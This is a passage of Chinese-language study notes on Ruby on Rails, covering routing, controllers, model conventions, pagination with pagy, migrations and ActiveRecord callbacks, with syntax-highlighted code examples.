 new_admin_user <span class="token constant">GET</span>    <span class="token operator">/</span>admin<span class="token operator">/</span>users<span class="token operator">/</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      admin<span class="token operator">/</span>users<span class="token comment">#new</span>
edit_admin_user <span class="token constant">GET</span>    <span class="token operator">/</span>admin<span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token operator">/</span>edit<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span> admin<span class="token operator">/</span>users<span class="token comment">#edit</span>
     admin_user <span class="token constant">GET</span>    <span class="token operator">/</span>admin<span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      admin<span class="token operator">/</span>users<span class="token comment">#show</span>
                <span class="token constant">PATCH</span>  <span class="token operator">/</span>admin<span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      admin<span class="token operator">/</span>users<span class="token comment">#update</span>
                <span class="token constant">PUT</span>    <span class="token operator">/</span>admin<span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      admin<span class="token operator">/</span>users<span class="token comment">#update</span>
                <span class="token constant">DELETE</span> <span class="token operator">/</span>admin<span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      admin<span class="token operator">/</span>users<span class="token comment">#destroy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Admin</span><span class="token double-colon punctuation">::</span>UsersController <span class="token operator">&lt;</span> ApplicationController
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<blockquote>
<p>scope ，不想在URL中显示 /admin的前缀</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 方式1</span>
scope <span class="token keyword">module</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'admin'</span></span> <span class="token keyword">do</span>
  resources <span class="token symbol">:users</span>
<span class="token keyword">end</span>
<span class="token comment"># 方式2</span>
resources <span class="token symbol">:users</span><span class="token punctuation">,</span> <span class="token symbol">module</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'admin'</span></span>
<span class="token comment"># 生成路由</span>
   Prefix Verb   <span class="token constant">URI</span> Pattern               Controller<span class="token comment">#Action</span>
    users <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>          admin<span class="token operator">/</span>users<span class="token comment">#index</span>
          <span class="token constant">POST</span>   <span class="token operator">/</span>users<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>          admin<span class="token operator">/</span>users<span class="token comment">#create</span>
 new_user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      admin<span class="token operator">/</span>users<span class="token comment">#new</span>
edit_user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token operator">/</span>edit<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span> admin<span class="token operator">/</span>users<span class="token comment">#edit</span>
     user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      admin<span class="token operator">/</span>users<span class="token comment">#show</span>
          <span class="token constant">PATCH</span>  <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      admin<span class="token operator">/</span>users<span class="token comment">#update</span>
          <span class="token constant">PUT</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      admin<span class="token operator">/</span>users<span class="token comment">#update</span>
          <span class="token constant">DELETE</span> <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      admin<span class="token operator">/</span>users<span class="token comment">#destroy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>嵌入路由</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">resources <span class="token symbol">:users</span> <span class="token keyword">do</span>
  <span class="token comment"># 这里表示 一个user内有多个blogs</span>
  resources <span class="token symbol">:blogs</span>
<span class="token keyword">end</span>

        Prefix Verb   <span class="token constant">URI</span> Pattern                              Controller<span class="token comment">#Action</span>
    user_blogs <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:user_id</span><span class="token operator">/</span>blogs<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>          blogs<span class="token comment">#index</span>
               <span class="token constant">POST</span>   <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:user_id</span><span class="token operator">/</span>blogs<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>          blogs<span class="token comment">#create</span>
 new_user_blog <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:user_id</span><span class="token operator">/</span>blogs<span class="token operator">/</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      blogs<span class="token comment">#new</span>
edit_user_blog <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:user_id</span><span class="token operator">/</span>blogs<span class="token operator">/</span><span class="token symbol">:id</span><span class="token operator">/</span>edit<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span> blogs<span class="token comment">#edit</span>
     user_blog <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:user_id</span><span class="token operator">/</span>blogs<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      blogs<span class="token comment">#show</span>
               <span class="token constant">PATCH</span>  <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:user_id</span><span class="token operator">/</span>blogs<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      blogs<span class="token comment">#update</span>
               <span class="token constant">PUT</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:user_id</span><span class="token operator">/</span>blogs<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      blogs<span class="token comment">#update</span>
               <span class="token constant">DELETE</span> <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:user_id</span><span class="token operator">/</span>blogs<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>      blogs<span class="token comment">#destroy</span>
         users <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>                         users<span class="token comment">#index</span>
               <span class="token constant">POST</span>   <span class="token operator">/</span>users<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>                         users<span class="token comment">#create</span>
      new_user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>                     users<span class="token comment">#new</span>
     edit_user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token operator">/</span>edit<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>                users<span class="token comment">#edit</span>
          user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>                     users<span class="token comment">#show</span>
               <span class="token constant">PATCH</span>  <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>                     users<span class="token comment">#update</span>
               <span class="token constant">PUT</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>                     users<span class="token comment">#update</span>
               <span class="token constant">DELETE</span> <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>                     users<span class="token comment">#destroy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>嵌入式路由，不要超过一层</p>
</blockquote>
<blockquote>
<p>排除不需要的action和请求方法，因为rails路由匹配是自上而下的，影响效率，并可能出现 bug</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">resources <span class="token symbol">:users</span> <span class="token punctuation">,</span> <span class="token symbol">only</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token symbol">:index</span><span class="token punctuation">,</span><span class="token symbol">:destroy</span><span class="token punctuation">]</span>  <span class="token comment"># users资源，只生成 index，destroy 访问行为</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>添加自定义的RESTFUL路由</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">resources <span class="token symbol">:users</span> <span class="token keyword">do</span>
  member <span class="token keyword">do</span>           <span class="token comment"># member 表示单个资源，所以会自动生成带有id的访问</span>
    post <span class="token symbol">:status</span>
  <span class="token keyword">end</span>
  collection <span class="token keyword">do</span>       <span class="token comment"># collection 表示集合资源，</span>
    get <span class="token symbol">:online</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

      Prefix Verb   <span class="token constant">URI</span> Pattern                 Controller<span class="token comment">#Action</span>
 status_user <span class="token constant">POST</span>   <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token operator">/</span>status<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span> users<span class="token comment">#status</span>
online_users <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span>online<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>     users<span class="token comment">#online</span>
       users <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>            users<span class="token comment">#index</span>
             <span class="token constant">POST</span>   <span class="token operator">/</span>users<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>            users<span class="token comment">#create</span>
    new_user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>        users<span class="token comment">#new</span>
   edit_user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token operator">/</span>edit<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>   users<span class="token comment">#edit</span>
        user <span class="token constant">GET</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>        users<span class="token comment">#show</span>
             <span class="token constant">PATCH</span>  <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>        users<span class="token comment">#update</span>
             <span class="token constant">PUT</span>    <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>        users<span class="token comment">#update</span>
             <span class="token constant">DELETE</span> <span class="token operator">/</span>users<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span>        users<span class="token comment">#destroy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>如果需要传入id，就是member方法，如果不需要，则是批量资源：collection，也可以这样定义</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">resources <span class="token symbol">:users</span> <span class="token keyword">do</span>
  post <span class="token symbol">:status</span><span class="token punctuation">,</span> <span class="token symbol">on</span><span class="token operator">:</span> <span class="token symbol">:member</span>
  get  <span class="token symbol">:online</span><span class="token punctuation">,</span> <span class="token symbol">on</span><span class="token operator">:</span> <span class="token symbol">:collection</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>非资源路由</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># /photos/show/1</span>
<span class="token comment"># /photos/show</span>
<span class="token comment"># /photos #=> index action  括号代码可选参数</span>
get <span class="token string-literal"><span class="token string">':controller(/:action(/:id))'</span></span>
<span class="token comment"># /photos/show/1/2</span>
get <span class="token string-literal"><span class="token string">':controller/:action/:id/:user_id'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>match，控制请求方式，例如：get或post请求</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">match <span class="token string-literal"><span class="token string">'photos'</span></span><span class="token punctuation">,</span><span class="token symbol">to</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"photos#show"</span></span><span class="token punctuation">,</span> <span class="token symbol">via</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token symbol">:get</span><span class="token punctuation">,</span><span class="token symbol">:post</span><span class="token punctuation">]</span>

Prefix Verb     <span class="token constant">URI</span> Pattern       Controller<span class="token comment">#Action</span>
photos <span class="token constant">GET</span><span class="token operator">|</span><span class="token constant">POST</span> <span class="token operator">/</span>photos<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span> photos<span class="token comment">#show</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>匹配约束，使用正则表达式，Ruby中是没有设计开头和结尾的</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># /photos/A12345</span>
get <span class="token string-literal"><span class="token string">'photos/:id'</span></span><span class="token punctuation">,</span> <span class="token symbol">to</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'photos#show'</span></span><span class="token punctuation">,</span> <span class="token symbol">constraint</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token comment"># 请求中的id的匹配规则</span>
    <span class="token symbol">id</span><span class="token operator">:</span> <span class="token regex-literal"><span class="token regex">/[A-Z]\d&#123;5&#125;/</span></span>
<span class="token punctuation">&#125;</span>
Prefix Verb <span class="token constant">URI</span> Pattern           Controller<span class="token comment">#Action</span>
       <span class="token constant">GET</span>  <span class="token operator">/</span>photos<span class="token operator">/</span><span class="token symbol">:id</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span> photos<span class="token comment">#show &#123;:constraint=>&#123;:id=>/[A-Z]\d&#123;5&#125;/&#125;&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>重定向</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">get <span class="token string-literal"><span class="token string">"/stories"</span></span><span class="token punctuation">,</span><span class="token symbol">to</span><span class="token operator">:</span> redirect<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/articles'</span></span><span class="token punctuation">)</span>
Prefix Verb <span class="token constant">URI</span> Pattern        Controller<span class="token comment">#Action</span>
stories <span class="token constant">GET</span>  <span class="token operator">/</span>stories<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token symbol">:format</span><span class="token punctuation">)</span> redirect<span class="token punctuation">(</span><span class="token number">301</span><span class="token punctuation">,</span> <span class="token operator">/</span>articles<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Mount</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">mount AdminApp<span class="token punctuation">,</span> <span class="token symbol">at</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'/admin'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h2><p>​    这里我们可以将一些公共函数写入BaseController，再将业务类继承BaseController，以达到方法公用</p>
<p><img src="../../typora-user-images/image-20230107194458907.png" alt="image-20230107194458907"></p>
<h3 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h3><blockquote>
<p>params</p>
</blockquote>
<p>​    获取get，post请求参数，可以通过Symbol或String访问到：<code>params[:user],params[&quot;user&quot;]</code></p>
<blockquote>
<p>session</p>
</blockquote>
<p>​    通过session记录当前用户信息: <code>session[:user_id]</code></p>
<blockquote>
<p>render</p>
</blockquote>
<p>​    组织 HTTP Response</p>
<blockquote>
<p>redirect_to</p>
</blockquote>
<p>​    请求重定向,这些方法均可在Controller与View中使用</p>
<h3 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h3><blockquote>
<p>Filter</p>
</blockquote>
<p>​    过滤器：<code>before_action,after_action,around_action</code></p>
<blockquote>
<p>CSRF</p>
</blockquote>
<p>​    这是一种安全策略，具体信息：<a href="https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf">https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf</a></p>
<blockquote>
<p>Helper_method</p>
</blockquote>
<p>​    将方法设定为Controller与View均可使用</p>
<h3 id="日志：Rails-logger"><a href="#日志：Rails-logger" class="headerlink" title="日志：Rails.logger"></a>日志：Rails.logger</h3><p>​    这里info可以改为其他级别</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">Rails<span class="token punctuation">.</span>logger<span class="token punctuation">.</span>info <span class="token string-literal"><span class="token string">"Information"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="ExceptHandle-异常拦截器"><a href="#ExceptHandle-异常拦截器" class="headerlink" title="ExceptHandle 异常拦截器"></a>ExceptHandle 异常拦截器</h3><p>​    统一捕捉异常</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">ApplicationController</span> <span class="token operator">&lt;</span> ActionController<span class="token double-colon punctuation">::</span>Base
  <span class="token comment"># 发生 RecordNotFound 异常时，执行 record_not_found 函数</span>
	rescue_from ActiveRecord<span class="token double-colon punctuation">::</span>RecordNotFound<span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> <span class="token symbol">:record_not_found</span>

  <span class="token keyword">private</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">record_not_found</span></span>
    render plain<span class="token operator">:</span> <span class="token string-literal"><span class="token string">"404 Not Found"</span></span><span class="token punctuation">,</span><span class="token symbol">status</span><span class="token operator">:</span> <span class="token number">404</span>
  <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ModelBasic"><a href="#ModelBasic" class="headerlink" title="ModelBasic"></a>ModelBasic</h2><h3 id="conventions-约定大于配置"><a href="#conventions-约定大于配置" class="headerlink" title="conventions 约定大于配置"></a>conventions 约定大于配置</h3><p>​    Model（单数） 数据表（复数），这里并不是单纯加个s，因为Person复数，表名为：people</p>
<p>​    class User      -&gt; 表：users</p>
<p>​    class Person  -&gt; people</p>
<p>​    class Blog      -&gt; blogs</p>
<blockquote>
<p>默认创建：id , creat_at , update_at 字段</p>
</blockquote>
<p>​    这里如果是使用生成器生成，想要修改表名，需修改：Model中指定：self.table_name=”” 和 migrate 移植文件</p>
<h3 id="分页操作"><a href="#分页操作" class="headerlink" title="分页操作"></a>分页操作</h3><p>官方网址：<a href="https://ddnexus.github.io/pagy/">https://ddnexus.github.io/pagy/</a></p>
<ol>
<li>Gemfile添加：`gem ‘pagy’, ‘~&gt; 6.0’</li>
<li>下载依赖：<code>bundle</code></li>
<li>在ApplicationController 中引入,这样所有的子类都能使用该方法了</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">ApplicationController</span> <span class="token operator">&lt;</span> ActionController<span class="token double-colon punctuation">::</span><span class="token constant">API</span>
    <span class="token keyword">include</span> Pagy<span class="token double-colon punctuation">::</span>Backend
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol start="4">
<li>在业务控制器中使用</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">UsersController</span> <span class="token operator">&lt;</span> ApplicationController
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">page</span></span>
    page <span class="token operator">=</span> params<span class="token punctuation">[</span><span class="token symbol">:page</span><span class="token punctuation">]</span>
    per <span class="token operator">=</span> params<span class="token punctuation">[</span><span class="token symbol">:per</span><span class="token punctuation">]</span>
    <span class="token comment"># 这里page(数据集合 , 分页的参数)，这里返回的一个数组，@pagy表示分页的参数新股</span>
    <span class="token comment"># @records 表示分页后的数据</span>
    <span class="token variable">@pagy</span><span class="token punctuation">,</span> <span class="token variable">@records</span> <span class="token operator">=</span> pagy<span class="token punctuation">(</span>User<span class="token punctuation">.</span>all<span class="token punctuation">,</span><span class="token symbol">page</span><span class="token symbol">:page</span><span class="token punctuation">,</span><span class="token symbol">items</span><span class="token symbol">:per</span><span class="token punctuation">)</span>
    render json<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-literal"><span class="token string">"records"</span></span><span class="token operator">=></span><span class="token variable">@records</span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"count"</span></span><span class="token operator">=></span><span class="token variable">@pagy</span><span class="token punctuation">.</span>count<span class="token punctuation">&#125;</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    这里我们可以按照需求将返回的Json任意组合</p>
<h3 id="crud操作"><a href="#crud操作" class="headerlink" title="crud操作"></a>crud操作</h3><h4 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h4><ul>
<li><code>where()</code></li>
<li><code>find_by()</code></li>
<li><code>first()</code></li>
<li><code>where().order().limit()</code></li>
</ul>
<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><ul>
<li><code>@user = user.find()</code></li>
<li><code>user.save()</code></li>
<li><code>user.update_all</code></li>
</ul>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><ul>
<li><code>user.destory()</code></li>
</ul>
<h3 id="Associations关联关系"><a href="#Associations关联关系" class="headerlink" title="Associations关联关系"></a>Associations关联关系</h3><ul>
<li>has_many : 一对多，多对多</li>
<li>has_one   ：一对一</li>
<li>belongs_to : 一对一</li>
<li>has_and_belongs_to_many : 多对多</li>
</ul>
<h2 id="Rails-跨域问题"><a href="#Rails-跨域问题" class="headerlink" title="Rails 跨域问题"></a>Rails 跨域问题</h2><p><a href="https://blog.csdn.net/topswim/article/details/79311592">https://blog.csdn.net/topswim/article/details/79311592</a></p>
<ol>
<li>Gemfile： <code>gem &#39;rack-cors&#39;, :require =&gt; &#39;rack/cors&#39;</code></li>
<li></li>
</ol>
<h2 id="Rails-移植与回调"><a href="#Rails-移植与回调" class="headerlink" title="Rails 移植与回调"></a>Rails 移植与回调</h2><p>​    主要负责数据库版本管理，进行数据库迁移或回调</p>
<ul>
<li><p>Migrations （ActiveRecord gem）</p>
</li>
<li><p>使用：</p>
<ul>
<li>rails g model 模型名         生成model文件与移植文件</li>
<li>rails g migration 文件名     生成移植文件，比如对原有数据表做修改，文件名最好可表示意义<ul>
<li><code>add_column :数据表 ,:字段名 ,字段类型</code></li>
<li>也可以使用rails g migration 查看参数</li>
</ul>
</li>
</ul>
</li>
<li><p>Rake</p>
<ul>
<li>rails  db:migrate    根据移植文件，向数据库中操作，每次更新到最新的数据库版本</li>
<li>rails  db:rollback   回退移植文件，这里我们也可以控制具体操作</li>
<li>rails  db:migrate:status   查看数据库状态</li>
<li>rake -T  查看rake所有的命令</li>
<li>rake db:version   查看当前数据库版本</li>
<li>migrate文件内其实是把整个环境加载进来，所以我们也可以直接对数据进行操作</li>
<li>Rake db:rollback step=2 向后回滚两个版本</li>
</ul>
<blockquote>
<p>永远不要修改已经提交的migration！！！</p>
</blockquote>
<h2 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h2></li>
</ul>
<p>​    在增删改查的操作上添加的回调事件，在执行增删改查的时候同步触发一些逻辑</p>
<blockquote>
<p>回调触发分类</p>
</blockquote>
<ol>
<li>Create an Object</li>
<li>Updating an Object</li>
<li>Destorying an Object</li>
<li>finding an Object</li>
</ol>
<h3 id="Create回调"><a href="#Create回调" class="headerlink" title="Create回调"></a>Create回调</h3><img src="../../typora-user-images/image-20230112192554270.png" alt="image-20230112192554270" style="zoom:80%;" />

<p>​    顺序也是严格按照图中的顺序执行。这些方法也都是类方法，可直接指定：<code>before_save :update_username</code></p>
<blockquote>
<p>需要注意：after_save 是已经存储到数据库了，但并未提交，如果在after_save针对模型又做出修改，不能再使用 self.save ,因为会触发死循环。</p>
</blockquote>
<h3 id="Update回调"><a href="#Update回调" class="headerlink" title="Update回调"></a>Update回调</h3><img src="../../typora-user-images/image-20230112193429505.png" alt="image-20230112193429505" style="zoom:80%;" />

<h3 id="Destroy回调"><a href="#Destroy回调" class="headerlink" title="Destroy回调"></a>Destroy回调</h3><img src="../../typora-user-images/image-20230112193459198.png" alt="image-20230112193459198" style="zoom:80%;" />

<h3 id="Find回调"><a href="#Find回调" class="headerlink" title="Find回调"></a>Find回调</h3><img src="../../typora-user-images/image-20230112193533698.png" alt="image-20230112193533698" style="zoom:80%;" />

<h3 id="触发callback的方法"><a href="#触发callback的方法" class="headerlink" title="触发callback的方法"></a>触发callback的方法</h3><img src="../../typora-user-images/image-20230112193615984.png" alt="image-20230112193615984" style="zoom:80%;" />

<h3 id="触发after-find-（基本不使用）"><a href="#触发after-find-（基本不使用）" class="headerlink" title="触发after_find （基本不使用）"></a>触发after_find （基本不使用）</h3><img src="../../typora-user-images/image-20230112193716012.png" alt="image-20230112193716012" style="zoom:80%;" />

<h3 id="跳过callback的触发方法"><a href="#跳过callback的触发方法" class="headerlink" title="跳过callback的触发方法"></a>跳过callback的触发方法</h3><img src="../../typora-user-images/image-20230112193746758.png" alt="image-20230112193746758" style="zoom:80%;" />

<h3 id="Callback参数"><a href="#Callback参数" class="headerlink" title="Callback参数"></a>Callback参数</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">User</span> ActiveRecord<span class="token double-colon punctuation">::</span>Base
